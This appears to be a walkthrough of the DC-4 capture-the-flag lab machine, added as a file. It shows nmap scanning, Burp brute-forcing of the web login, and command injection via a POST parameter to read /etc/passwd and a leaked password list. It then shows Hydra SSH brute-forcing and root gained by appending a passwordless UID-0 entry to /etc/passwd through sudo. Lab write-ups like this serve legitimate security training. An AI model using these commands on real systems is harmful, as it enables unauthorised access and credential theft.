@@ -1,0 +1,593 @@
+DC-4 is a boot2root machine.
+Difficulty: Medium
+IP:192.168.0.151
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# nmap -A -T4 -p- 192.168.0.151
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 18:51 IST
+Nmap scan report for 192.168.0.151
+Host is up (0.0014s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
+80/tcp open  http    nginx 1.15.10
+|_http-server-header: nginx/1.15.10
+|_http-title: System Tools
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/25%OT=22%CT=1%CU=34889%PV=Y%DS=2%DC=T%G=Y%TM=5F6DEF1
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=92BE%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT     ADDRESS
+1   0.45 ms LAPTOP-U5913CMD.mshome.net (172.30.80.1)
+2   1.89 ms 192.168.0.151
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.49 seconds
+
+
+I fired up dirb and I didn't get anything to move further.
+
+I searched for sql injection but no results.
+
+Then I randomly inputed username and password(default) but still nothing.
+I thought this was the dead end.
+
+I thought of bruteforcing the password as we already know the username might be admin.
+
+So I fired up burpsuite and went to intruder tab for cluster bomb attack.
+
+I added username as admin and password as a list of top 10 million password from SecLists.
+
+And after some time I got a difference in length.
+
+The password is happy.I was able to get more passwords like password123.I was still logged in using password123.That's strange
+
+Message: "You are currently logged in"
+
+
+POST /command.php HTTP/1.1
+Host: 192.168.0.151
+Content-Length: 32
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.0.151
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.0.151/command.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=eargsd2g2ia26kqgq1dmj8n5r6
+Connection: close
+
+radio=cat+/etc/passwd&submit=Run
+
+As you can see I can modify the radio parameter in Burp Suite.
+Firstly it was ls -la and now I changed it to cat+/etc/passwd
+The + sign overhere indicates spaace.
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+
+
+So navigating through the entire system, I was able to find something interesting.
+
+POST /command.php HTTP/1.1
+Host: 192.168.0.151
+Content-Length: 41
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.0.151
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.0.151/command.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=eargsd2g2ia26kqgq1dmj8n5r6
+Connection: close
+
+radio=ls+-la+/home/jim/backups&submit=Run
+
+Response:
+  
+			
+You have selected: ls -la /home/jim/backups<br /><pre>total 12
+
+drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .
+drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..
+-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak
+</pre><p><a href='login.php'>Return to the menu.</a>			
+	
+POST /command.php HTTP/1.1
+Host: 192.168.0.151
+Content-Length: 56
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.0.151
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.0.151/command.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=eargsd2g2ia26kqgq1dmj8n5r6
+Connection: close
+
+radio=cat+/home/jim/backups/old-passwords.bak&submit=Run
+
+Response:
+
+You have selected: cat /home/jim/backups/old-passwords.bak<br /><pre>000000
+12345
+iloveyou
+1q2w3e4r5t
+1234
+123456a
+qwertyuiop
+monkey
+123321
+dragon
+654321
+666666
+123
+myspace1
+a123456
+121212
+1qaz2wsx
+123qwe
+123abc
+tinkle
+target123
+gwerty
+1g2w3e4r
+gwerty123
+zag12wsx
+7777777
+qwerty1
+1q2w3e4r
+987654321
+222222
+qwe123
+qwerty123
+zxcvbnm
+555555
+112233
+fuckyou
+asdfghjkl
+12345a
+123123123
+1q2w3e
+qazwsx
+loveme1
+juventus
+jennifer1
+!~!1
+bubbles
+samuel
+fuckoff
+lovers
+cheese1
+0123456
+123asd
+999999999
+madison
+elizabeth1
+music
+buster1
+lauren
+david1
+tigger1
+123qweasd
+taylor1
+carlos
+tinkerbell
+samantha1
+Sojdlg123aljg
+joshua1
+poop
+stella
+myspace123
+asdasd5
+freedom1
+whatever1
+xxxxxx
+00000
+valentina
+a1b2c3
+741852963
+austin
+monica
+qaz123
+lovely1
+music1
+harley1
+family1
+spongebob1
+steven
+nirvana
+1234abcd
+hellokitty
+thomas1
+cooper
+520520
+muffin
+christian1
+love13
+fucku2
+arsenal1
+lucky7
+diablo
+apples
+george1
+babyboy1
+crystal
+1122334455
+player1
+aa123456
+vfhbyf
+forever1
+Password
+winston
+chivas1
+sexy
+hockey1
+1a2b3c4d
+pussy
+playboy1
+stalker
+cherry
+tweety
+toyota
+creative
+gemini
+pretty1
+maverick
+brittany1
+nathan1
+letmein1
+cameron1
+secret1
+google1
+heaven
+martina
+murphy
+spongebob
+uQA9Ebw445
+fernando
+pretty
+startfinding
+softball
+dolphin1
+fuckme
+test123
+qwerty1234
+kobe24
+alejandro
+adrian
+september
+aaaaaa1
+bubba1
+isabella
+abc123456
+password3
+jason1
+abcdefg123
+loveyou1
+shannon
+100200
+manuel
+leonardo
+molly1
+flowers
+123456z
+007007
+password.
+321321
+miguel
+samsung1
+sergey
+sweet1
+abc1234
+windows
+qwert123
+vfrcbv
+poohbear
+d123456
+school1
+badboy
+951753
+123456c
+111
+steven1
+snoopy1
+garfield
+YAgjecc826
+compaq
+candy1
+sarah1
+qwerty123456
+123456l
+eminem1
+141414
+789789
+maria
+steelers
+iloveme1
+morgan1
+winner
+boomer
+lolita
+nastya
+alexis1
+carmen
+angelo
+nicholas1
+portugal
+precious
+jackass1
+jonathan1
+yfnfif
+bitch
+tiffany
+rabbit
+rainbow1
+angel123
+popcorn
+barbara
+brandy
+starwars1
+barney
+natalia
+jibril04
+hiphop
+tiffany1
+shorty
+poohbear1
+simone
+albert
+marlboro
+hardcore
+cowboys
+sydney
+alex
+scorpio
+1234512345
+q12345
+qq123456
+onelove
+bond007
+abcdefg1
+eagles
+crystal1
+azertyuiop
+winter
+sexy12
+angelina
+james
+svetlana
+fatima
+123456k
+icecream
+popcorn1
+</pre>
+
+
+Now that I have got passwords I can brute force the ssh using hydra tool.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# hydra -l jim -P passwords.txt ssh://192.168.0.151 -t 4
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 20:14:57
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 251 login tries (l:1/p:251), ~63 tries per task
+[DATA] attacking ssh://192.168.0.151:22/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 207 to do in 00:05h, 4 active
+
+[STATUS] 34.67 tries/min, 104 tries in 00:03h, 147 to do in 00:05h, 4 active
+[STATUS] 31.00 tries/min, 124 tries in 00:04h, 127 to do in 00:05h, 4 active
+[STATUS] 29.40 tries/min, 147 tries in 00:05h, 104 to do in 00:04h, 4 active
+[STATUS] 30.67 tries/min, 184 tries in 00:06h, 67 to do in 00:03h, 4 active
+[STATUS] 29.14 tries/min, 204 tries in 00:07h, 47 to do in 00:02h, 4 active
+[22][ssh] host: 192.168.0.151   login: jim   password: jibril04
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 20:22:12
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# 
+
+Finally...got something after waiting for so long :P
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# ssh jim@192.168.0.151
+The authenticity of host '192.168.0.151 (192.168.0.151)' can't be established.
+ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.151' (ECDSA) to the list of known hosts.
+jim@192.168.0.151's password: 
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
+jim@dc-4:~$ id
+uid=1002(jim) gid=1002(jim) groups=1002(jim)
+jim@dc-4:~$ 
+
+jim@dc-4:/$ cd var
+jim@dc-4:/var$ ls
+backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
+jim@dc-4:/var$ cd mail
+jim@dc-4:/var/mail$ ls
+jim
+jim@dc-4:/var/mail$ cat jim
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Return-path: <charles@dc-4>
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+Received: from charles by dc-4 with local (Exim 4.89)
+        (envelope-from <charles@dc-4>)
+        id 1hCjIX-0000kO-Qt
+        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
+From: Charles <charles@dc-4>
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+Status: O
+
+Hi Jim,
+
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
+
+Password is:  ^xHhA&hvim0y
+
+See ya,
+Charles
+
+
+jim@dc-4:/var/mail$ su charles
+Password: 
+charles@dc-4:/var/mail$ id
+uid=1001(charles) gid=1001(charles) groups=1001(charles)
+charles@dc-4:/var/mail$ clear
+charles@dc-4:/var/mail$ id
+uid=1001(charles) gid=1001(charles) groups=1001(charles)
+charles@dc-4:/var/mail$ 
+
+
+Woah that was easy..now that we are charles lets see what sudo -l gives us.
+
+
+charles@dc-4:/var/mail$ sudo -l
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+charles@dc-4:/var/mail$ 
+
+We can write something to a file using teehe.
+So I found something from the internet regarding writing to a /etc/passwd file.
+We can get root access by writing the following line into /etc/passwd.
+
+"akshay::0:0:::/bin/bash" - This can help us get root access
+
+charles@dc-4:/usr/bin$ echo "akshay::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
+akshay::0:0:::/bin/bash
+charles@dc-4:/usr/bin$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+akshay::0:0:::/bin/bash
+
+
+charles@dc-4:/usr/bin$ su akshay
+root@dc-4:/usr/bin# id
+uid=0(root) gid=0(root) groups=0(root)
+root@dc-4:/usr/bin# 
+
+root@dc-4:/home# cd /root
+root@dc-4:/root# ls
+flag.txt
+root@dc-4:/root# cat flag.txt
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  "Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+root@dc-4:/root# 
+
+Thank you...Happy Hacking :)
